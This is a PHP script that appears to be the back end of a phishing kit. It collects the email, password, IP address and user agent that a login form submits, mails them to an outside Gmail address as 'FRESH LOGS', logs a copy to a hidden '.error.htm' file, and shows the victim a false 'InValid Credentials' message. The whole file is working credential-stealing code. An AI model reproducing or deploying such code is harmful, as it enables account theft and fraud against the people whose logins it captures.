<?php
$user = trim($_POST['user']);
$pass = trim($_POST['pass']);
$detail = trim($_POST['detail']);
if($user != null && $pass != null){
	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------|YBA|--------------|\n";
	$message .= "Login From           : ".$detail."\n";
	$message .= "EMAIL         : ".$user."\n";
	$message .= "PASSWORD      : ".$pass."\n";
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- YBA-------------|\n";
	$send = "ybablack735@gmail.com";
	$subject = "YBA FRESH LOGS [JP]: $ip";
    mail($send, $subject, $message);   
	
    	$data = "\n".$message;
	$fp = fopen('.error.htm', 'a');
	fwrite($fp, $data);
	fclose($fp); 


	$signal = 'ok';
	$msg = 'InValid Credentials';
	
	// $praga=rand();
	// $praga=md5($praga);
}
else{
	$signal = 'bad';
	$msg = 'Please fill in all the fields.';
}
$data = array(
        'signal' => $signal,
        'msg' => $msg,
        'redirect_link' => $redirect,
    );
    echo json_encode($data);

?>